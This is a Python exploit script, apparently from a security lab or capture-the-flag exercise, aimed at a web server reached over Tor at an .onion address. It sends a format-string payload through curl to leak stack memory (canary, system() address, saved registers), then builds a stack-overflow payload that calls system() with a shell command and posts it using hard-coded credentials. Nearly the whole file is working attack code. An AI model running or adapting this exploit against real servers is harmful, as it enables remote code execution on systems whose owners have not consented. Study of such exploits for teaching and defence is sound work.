
import os

#======================================================================================

OUTFILE   = "out.txt"
PAYLOAD_FILE = "payload.bin"

URL = 'http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/check_secret.html'
COMMAND_BEFORE = "curl -v -u '"
COMMAND_AFTER  = "':password --socks5-hostname 127.0.0.1:9150 " + URL

OVERFLOW_URL = "curl -v -u admin:hammertime --socks5-hostname 127.0.0.1:9150 " + URL + " -H 'Content-Length:0' --http0.9 --data-binary '@" + PAYLOAD_FILE + "'"

#======================================================================================

command = "curl ifconfig.me"

#======================================================================================

def get_output():
	file = open(OUTFILE)
	lines = file.readlines()
	if not lines:
		return None
	return lines

def printf_payload(sub, amount):
	payload = ''
	count = 0
	while count < amount:
		payload = payload + sub + " "
		count += 1
	return payload 

def zero_in(word):
	while len(word) < 8:
		word = '0' + word
	return word

def overflow_printf(pattern, amount):
	os.system(COMMAND_BEFORE + printf_payload(pattern, amount) + COMMAND_AFTER + " 2>&1 |  tail -n 6 | head -n 1 > " + OUTFILE)
	results = get_output()[0].replace(' "\n', '').replace('"','')[47:]
	# print(results)

	clean_results = []
	for word in results.split():
		clean_results.append( zero_in(word))
	return clean_results

def print_memory(list, len, separator):
	linesize = len
	print("|     ", end='', flush=True)
	for i, item in enumerate(list):
		print(item + separator, end='', flush=True)
		if (i+1)%linesize == 0	:
			print("\n|     ", end='', flush=True)
	print()

def bytes_to_bin_file(bytes_payload):
	payload_file = open(PAYLOAD_FILE, "wb")
	payload_file.write(bytearray(bytes_payload))

#======================================================================================

def get_post_data(over_worlds):
	return (int(over_worlds[17], 16) - int("78", 16))

def get_canary(over_worlds):
	# Replace '00' with '26' to allow strcpy to copy after the canary
	# The loop below strcpy will replace '0x26' (='&') with '0x00' (='\0') afterwards
	# so the final value of the canary will be the correct one
	return int(over_worlds[26].replace("00","26"),16) 

def get_system_address(over_worlds):
	return (int(over_worlds[23], 16) - int("033C07", 16))

def get_base_address(over_worlds):
	return (int(over_worlds[29], 16) - int("58", 16) + int("28", 16))

def get_ebx(over_worlds):
	return int(over_worlds[28], 16)

def get_ebp(over_worlds):
	return (int(over_worlds[23], 16) - int("033C07", 16) + int("46FC34", 16))

def get_esi(over_worlds):
	return int(over_worlds[29], 16)

#======================================================================================
# Overflow printf to read from the server's memory
#======================================================================================

results = overflow_printf("%x", 37)

print("\n ____________________________________________________________________________")
print("|                                                                            |")
print("|   > Printf Overflow Results:                                               |")
print("|____________________________________________________________________________|")
print("|                                                                            |")
print_memory(results, 6, " ")
print("|____________________________________________________________________________|")

#======================================================================================
# Extract the needed values based on the overflow results
#======================================================================================

payload = bytes()

padding = int("ffffffff",16).to_bytes(4,"big")

post_data = get_post_data(results)
canary  = get_canary(results)
system  = get_system_address(results)
address = get_base_address(results)
ebx = get_ebx(results)
ebp = get_ebp(results)
esi = get_esi(results)

print("\n")
print(" (i) Overflow Report:")
print("     Post_data Address:   ", post_data.to_bytes(4,"big").hex())
print("     Canary:              ", canary.to_bytes(4,"big").hex())
print("     System Address:      ", system.to_bytes(4,"big").hex())
print("     Canary Address - 12: ", address.to_bytes(4,"big").hex())
print("     EBX:                 ", ebx.to_bytes(4,"big").hex())
print("     EBP:                 ", ebp.to_bytes(4,"big").hex())
print("     ESI:                 ", esi.to_bytes(4,"big").hex())

#======================================================================================

# Convert to little endian to send to the remote server
post_data = post_data.to_bytes(4,"little")
canary  = canary.to_bytes(4,"little")
system  = system.to_bytes(4,"little")
address = address.to_bytes(4,"little")
ebx = ebx.to_bytes(4,"little")
ebp = ebp.to_bytes(4,"little")
esi = esi.to_bytes(4,"little")

#======================================================================================

print("\n (i) Generating payload...")
for i in range(13):
	payload += padding

payload += post_data
payload += padding
payload += canary
payload += ebx
payload += ebp
payload += esi
payload += system
payload += padding
payload += address
payload += bytes(command, 'utf-8')
payload += b"&"


print("\n ____________________________________________________________________________")
print("|                                                                            |")
print("|   > Resulting Payload:                                                     |")
print("|____________________________________________________________________________|")
print("|                                                                            |")
print_memory(payload.hex(), 66, "")
print("|____________________________________________________________________________|")

print("\n (i) Exporting payload to binary file...")
bytes_to_bin_file(payload)

print(" (i) Executing command:")
print("     " + OVERFLOW_URL)
print("\n ____________________________________________________________________________\n\n")
os.system(OVERFLOW_URL)

